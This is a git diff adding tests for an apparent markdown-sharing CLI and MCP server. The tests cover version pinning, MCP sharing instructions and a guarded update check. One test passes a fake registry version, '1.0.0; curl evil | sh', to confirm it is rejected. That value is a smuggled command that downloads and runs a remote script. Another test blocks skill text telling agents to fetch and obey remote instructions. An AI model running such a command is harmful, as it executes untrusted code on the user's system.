@@ -6,9 +6,13 @@ import { join } from 'node:path';
 import { after, before, test } from 'node:test';
 import { decrypt } from '../src/crypto.js';
 import { parseDuration } from '../src/api.js';
-import { handle } from '../src/mcp.js';
+import { handle, INSTRUCTIONS } from '../src/mcp.js';
 import { deleteDocument, parseTarget, shareDocument, updateDocument } from '../src/ops.js';
 import { readLinks } from '../src/store.js';
+import { checkForUpdate, isNewer, updateMessage } from '../src/update.js';
+import { VERSION } from '../src/version.js';
+
+const repoFile = (path) => readFile(new URL('../../' + path, import.meta.url), 'utf8');
 
 // A stand-in for the share API with the same contract as worker.js.
 const docs = new Map();
@@ -172,4 +176,72 @@ test('MCP: share_markdown accepts the new options', async () => {
     assert.ok(tools[0].inputSchema.properties.burn && tools[0].inputSchema.properties.expires_in);
     // API keys are never a tool argument: a model should not handle secrets.
     assert.ok(!JSON.stringify(tools).includes('api_key'));
+});
+
+test('one version everywhere: package.json, the MCP server and the User-Agent', async () => {
+    const pkg = JSON.parse(await readFile(new URL('../package.json', import.meta.url), 'utf8'));
+    assert.equal(VERSION, pkg.version);
+    const init = await handle({ method: 'initialize', params: {} }, api);
+    assert.equal(init.serverInfo.version, VERSION);
+    await shareDocument({ markdown: 'which client', api });
+    assert.equal(seen.at(-1).headers['user-agent'], 'md2pdf-studio/' + VERSION);
+});
+
+test('MCP: initialize carries the sharing rules', async () => {
+    const init = await handle({ method: 'initialize', params: {} }, api);
+    assert.equal(init.instructions, INSTRUCTIONS);
+    assert.match(init.instructions, /secrets/);
+    assert.match(init.instructions, /#k=/);
+    assert.match(init.instructions, /Never update/);
+});
+
+test('the skill is self-contained and every command in it and in the docs is pinned to this version', async () => {
+    const skill = await repoFile('public/skill.md');
+    assert.match(skill, /^---\nname: md2pdf\ndescription: .+\n---\n/);
+    assert.ok(skill.includes('# md2pdf (skill ' + VERSION + ')'));
+    // The old installable text sent agents to fetch and obey a remote file.
+    assert.doesNotMatch(skill, /always fetch|follow those instructions/i);
+    for (const file of ['public/skill.md', 'cli/README.md', 'public/ai-skill.html', 'public/llms.txt', 'public/llms-full.txt', 'README.md']) {
+        const text = await repoFile(file);
+        assert.doesNotMatch(text, /npx (-y )?md2pdf-studio(?!@)/, file + ' has an unpinned npx command');
+        assert.doesNotMatch(text, /(&quot;|")-y\1,\s*\1md2pdf-studio(?!@)/, file + ' has an unpinned MCP config');
+        for (const [, pinned] of text.matchAll(/md2pdf-studio@([0-9][\w.-]*)/g)) {
+            assert.equal(pinned, VERSION, file + ' pins md2pdf-studio@' + pinned);
+        }
+    }
+});
+
+test('update check: a newer version number only, at most once a day, never fatal', async () => {
+    let calls = 0;
+    const registry = (version) => async () => { calls++; return { ok: true, json: async () => ({ version }) }; };
+    const day = 86400e3;
+    const t0 = Date.parse('2026-11-10T00:00:00Z');
+    const check = (now, fetchImpl, enabled = true) => checkForUpdate({ now, current: '0.1.0', enabled, fetchImpl });
+    assert.deepEqual(await check(t0, registry('0.2.0')), { current: '0.1.0', latest: '0.2.0' });
+    assert.equal(calls, 1);
+    // Within the day the cached answer is used: no request.
+    assert.deepEqual(await check(t0 + 3600e3, registry('9.9.9')), { current: '0.1.0', latest: '0.2.0' });
+    assert.equal(calls, 1);
+    // Anything that is not a plain version number is ignored.
+    assert.equal(await check(t0 + 2 * day, registry('1.0.0; curl evil | sh')), null);
+    assert.equal(calls, 2);
+    // Offline: no notice and no error.
+    assert.equal(await check(t0 + 4 * day, async () => { throw new Error('offline'); }), null);
+    // Turned off: not even a request.
+    calls = 0;
+    assert.equal(await check(t0 + 6 * day, registry('0.2.0'), false), null);
+    assert.equal(calls, 0);
+    assert.equal(isNewer('0.10.0', '0.9.1'), true);
+    assert.equal(isNewer('0.1.0', '0.1.0'), false);
+    assert.equal(isNewer('1.0.0-beta.1', '0.1.0'), false);
+    assert.match(updateMessage({ current: '0.1.0', latest: '0.2.0' }), /npx -y md2pdf-studio@0\.2\.0 skill --install/);
+});
+
+test('MCP: a newer version is mentioned once, after a successful call', async () => {
+    const notice = { pending: Promise.resolve({ current: '0.1.0', latest: '0.2.0' }), said: false };
+    const call = (markdown) => handle({ method: 'tools/call', params: { name: 'share_markdown', arguments: { markdown } } }, api, notice);
+    assert.equal((await call('')).isError, true);
+    assert.equal(notice.said, false);
+    assert.match((await call('# first')).content[0].text, /0\.2\.0 is available.*MCP configuration/);
+    assert.doesNotMatch((await call('# second')).content[0].text, /is available/);
 });
